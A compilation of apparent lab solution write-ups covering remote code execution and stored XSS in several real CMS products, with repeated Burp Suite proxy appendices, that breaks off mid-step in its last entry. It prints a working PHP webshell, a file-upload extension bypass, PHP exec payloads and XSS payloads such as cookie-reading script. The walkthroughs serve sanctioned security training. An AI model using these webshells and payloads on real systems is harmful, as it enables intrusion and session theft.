Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “Clipper CMS remote code execution” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/38730  
 
 
 
 
 
 
 
 
 
 
Step 3: ​Save the python script provided at the Exploit DB link as exploit.py 
 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​python exploit.py 
 
 
 
The exploitation script requires the vulnerable URL and the credentials to be passed as 
arguments.  
 
Step 5: ​Exploit the vulnerable web application. 
 
 
 
The credential of the admin portal of the web application is provided in the challenge description 
 
●
Username: admin 
●
Password: password 
 
Run the exploitation script with required arguments.  
 
Command: ​python exploit.py 
http://pb78n214jn6xny0hanpgl68kg.public2.attackdefenselabs.com/clipper/ admin password 
 
 
 
The exploitation was successful.  
 
Step 6: ​Verify that exploitation was successful by execute system commands on the 
compromised web application through the webshell. 
 
Commands:  
id 
whoami 
 
 
 
 
References:  
 
1.
ClipperCMS (​http://www.clippercms.com/​)  
2.
ClipperCMS 1.3.0 Code Execution (​ ​https://www.exploit-db.com/exploits/38730​)  
 
 
 
 
 
Name 
 Lepton CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=430  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “lepton remote code execution” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the information required to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40801  
 
 
 
 
 
 
 
 
 
 
Step 3: ​Login to the admin portal of the web application. 
 
The credential of the admin portal of the web application is provided in the challenge description 
 
●
Username: admin 
●
Password: password 
 
 
 
 
 
 
 
 
Admin Dashboard:  
 
 
 
 
 
Step 4: ​Navigate to Media tab. 
 
 
 
Step 5: ​Create a webshell and save it as “shell.png”. 
 
PHP Webshell: 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.png 
 
 
  
 
Step 6: ​Configure burp suite to intercept request 
 
In mozilla firefox navigate to the URL given below: 
 
URL: ​about:preferences 
 
 
 
 
 
 
 
 
 
 
 
 
Navigate to the “Advanced” Tab on the Left panel. 
 
 
 
Select the “Network” Tab. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the “Settings” button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
Enter “127.0.0.1” in “HTTP Proxy” text field and Enter port number as 8080  
 
 
 
 
 
 
 
 
 
 
Start Burp Suite and make sure that the “running” checkbox is selected for the interface 
“127.0.0.1:8080”. 
 
 
 
Step 7: ​Upload the “shell.png” file and intercept the request with burp suite. 
 
Upload the “shell.png” file. 
 
 
 
 
 
 
 
 
 
 
 
Click on Upload files option and the request will be intercepted by burp suite. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 8: ​Forward the intercepted request after making the required changes to the request. 
 
Modify the filename and content-type in the request. 
 
Before:  
Content-Disposition: form-data; name="upload[]"; filename="shell.png" 
Content-Type: image/png 
 
 
 
 
After:  
Content-Disposition: form-data; name="upload[]"; filename="shell.png.php5" 
Content-Type: application/x-php 
 
 
 
Forward the request. 
 
 
 
 
 
 
 
 
The file was uploaded successfully.  
 
Step 9: ​Execute commands on the web server through the uploaded webshell. 
 
Command: ​id 
 
URL: 
http://bfj5jqblhoedyngh8aoi03pxa.public2.attackdefenselabs.com/media/shell.png.php5?cmd=id  
 
 
 
 
References:  
 
1.
LEPTON (​https://github.com/LEPTON-project/LEPTON​)  
2.
LEPTON 2.2.2 - Remote Code Execution (​https://www.exploit-db.com/exploits/40801​)  
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
Name 
Lunar CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=431  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “lunar cms remote code execution” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/33867  
 
 
 
 
 
 
 
 
 
 
Step 3: ​Save the python script provided at the Exploit DB link as exploit.py 
 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​python exploit.py 
 
 
 
The exploitation script requires the hostname, path of the web application and the name of the 
backdoor php script to be passed as arguments.  
 
 
Step 5: ​Login to the web application and create backdoor.php file.  
 
The credential of the admin portal of the web application is provided in the challenge description 
 
●
Username: admin@localhost.xyz 
●
Password: password1 
 
Admin Dashboard:  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Navigate to Tools tab and select File manager. 
 
 
 
Create a file named backdoor.php by using the “New text file” option in the file manager.  
 
 
 
Step 6: ​Exploit the vulnerable web application. 
 
Run the exploitation script with required arguments.  
 
Commands:  
python exploit.py 2ckvwxk98zgs2xj5b1m54kjlw.public1.attackdefenselabs.com / backdoor.php  
id  
whoami 
 
 
 
 
 
 
 
 
References:  
 
1.
LunarCMS (​https://github.com/lunarcms/LunarCMS​)  
2.
Lunar CMS 3.3 - Remote Command Execution 
(​https://www.exploit-db.com/exploits/33867​) 
 
 
 
 
 
 
 
Name 
Ajax Explorer 1.10.3.2 
URL 
https://www.attackdefense.com/challengedetails?cid=487  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “Ajax Explorer 1.10.3.2 cms remote code execution” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains details regarding the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39876  
 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Login to the web application and take advantage of the terminal feature of Ajax Explorer 
to create a file. 
 
The credential of the admin portal web application is provided in the challenge description 
 
●
Username: admin 
●
Password: password 
 
Admin Dashboard:  
 
 
 
 
 
 
Click on the terminal icon on the navigation bar of Ajax Explorer web application and inject the 
payload in the text box. 
 
Payload: ​<?php echo exec('id');?> 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. Once the file is saved click on the open button and the content of the 
file will be displayed in the file editor.  
 
 
 
 
 
 
 
 
 
 
On the tab of the file editor, the path is “P:/terminal”. This path can be used to access the file 
through the Ajax Explorer web application. 
 
In the terminal window, the path is “/app/ae.user/admin/myprofile/terminal”. This path is the 
actual location of the script on the web server. A similar path is mentioned on the exploit db link. 
 
 
Step 4: ​Use the path information obtained from previous step to check whether the created file 
can be accessed directly. 
 
URL: 
http://xwzpket1pmudmgnvklcs7cuxl.public2.attackdefenselabs.com/ae.user/admin/myprofile/ter
minal  
 
 
 
The created file can be accessed directly.  
 
 
Step 5: ​Rename the created file and append php extension to the filename.  
 
Enter “P:/” in the address bar of Ajax Explorer.  
 
Right click on the “terminal” file and select the “Rename” option. 
 
 
 
 
 
Append “.php” in the filename 
 
 
 
The “terminal” file was renamed to “terminal.php”. 
 
Step 6: ​Navigate to the URL given below to execute “terminal.php” script. 
 
URL: 
http://xwzpket1pmudmgnvklcs7cuxl.public2.attackdefenselabs.com/ae.user/admin/myprofile/ter
minal.php  
 
 
 
References:  
 
1.
Ajax Explorer (​https://sourceforge.net/projects/ajax-explorer/​)  
2.
AjaxExplorer 1.10.3.2 - Multiple Vulnerabilities 
 (​https://www.exploit-db.com/exploits/39876​)  
 
 
 
 
 
Name 
ApPHP MicroBlog 
URL 
https://www.attackdefense.com/challengedetails?cid=29  
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “ApPHP MicroBlog exploit”. 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter required to 
exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40505 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Click on comments.  
 
 
 
 
 
 
 
Step 4: ​Enter the XSS payload in the “Your Name” field and fill other text fields. 
 
Payload: ​<script>alert(document.cookie)</script> 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Publish the comment and the XSS payload will be executed.  
 
 
 
References:  
 
1.
ApPHP MicroBlog (​https://www.apphp.com/php-microblog​)  
2.
ApPHP MicroBlog 1.0.2 - Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/40505​)  
 
 
 
Name 
MyBB Downloads Plugin 
URL 
https://www.attackdefense.com/challengedetails?cid=9 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “MyBB Downloads Plugin vulnerability” and look for publicly available 
exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44400 
 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
http://ocgvy1ejrur9vzo2zxsi0e3u1.mumbaix.attackdefenselabs.com/member.php?action=login 
 
Credentials: 
●
Username: ​test2 
●
Password: ​password 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to the downloads page. 
 
URL: ​http://ocgvy1ejrur9vzo2zxsi0e3u1.mumbaix.attackdefenselabs.com/downloads.php 
 
 
 
Step 5: ​Click on the General button. 
 
 
 
Step 6: ​Click on New Download button. 
 
 
Step 7: ​Inject the payload in the title field and enter any data in Short description, Download 
description, Title page field. 
 
Payload: ​<BODY ONLOAD=alert('XSS')> 
 
 
 
Click on Publish Download button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
MyBB (​https://mybb.com/​) 
2.
MyBB Plugin Downloads 
(​https://community.mybb.com/mods.php?action=view&pid=854​)  
3.
MyBB Plugin Downloads 2.0.3 - Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/44400​)  
 
 
 
Name 
PBBoard CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=25 
Type 
Real World Webapps: Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “pbboard vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/35491 
 
 
 
Step 3:​ According to the exploit to trigger the vulnerability 2 accounts are required, first for the 
sender and second for the receiver. Click on the register button. 
 
 
 
Click on Agree 
 
 
 
Step 4: ​Enter “guest1” in the username and “password” for the password field. This user will be 
used as a receiver. 
 
 
 
Click on Complete registration. 
 
Step 5: ​Sign out and log in with the following credentials: 
 
guest2 as username and “password” for the password field, this user will be used as the sender. 
 
 
 
 
 
 
 
 
 
 
Click on Complete registration. 
 
Step 6: ​Navigate to the inbox section by clicking on the inbox button available at the top right 
section of the web page. 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 7: ​Click on Compose message and enter guest1 in the receiver field. Enter any data in the 
rest of the fields and click on “Save” button while intercepting the request with burp suite 
 
To configure Burp Suite check the Appendix. 
 
 
 
Step 8: ​Modify the content of “text” and inject the payload. Click on the forward button. 
 
Payload: ​</div><font color=red><body onload="prompt( 
String.fromCharCode(120,115,115,32,116,101,115,116));">// 
 
 
 
Step 9: ​Sign out and log in as guest1. Upon login, a notification will appear. 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on “Read the message” 
 
 
 
The XSS payload triggered successfully. 
 
References:  
 
1.
PBBoard  (​http://www.pbboard.info/​) 
2.
PBBoard CMS - Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/35491​)  
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
Name 
ApPHP MicroBlog 
URL 
https://www.attackdefense.com/challengedetails?cid=29  
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “ApPHP MicroBlog exploit”. 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter required to 
exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40505 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Click on comments.  
 
 
 
 
 
 
 
Step 4: ​Enter the XSS payload in the “Your Name” field and fill other text fields. 
 
Payload: ​<script>alert(document.cookie)</script> 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Publish the comment and the XSS payload will be executed.  
 
 
 
References:  
 
1.
ApPHP MicroBlog (​https://www.apphp.com/php-microblog​)  
2.
ApPHP MicroBlog 1.0.2 - Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/40505​)  
 
 
 
Name 
Family CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=300 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “family cms vulnerability xss” and look for publicly available exploits. 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/18230 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
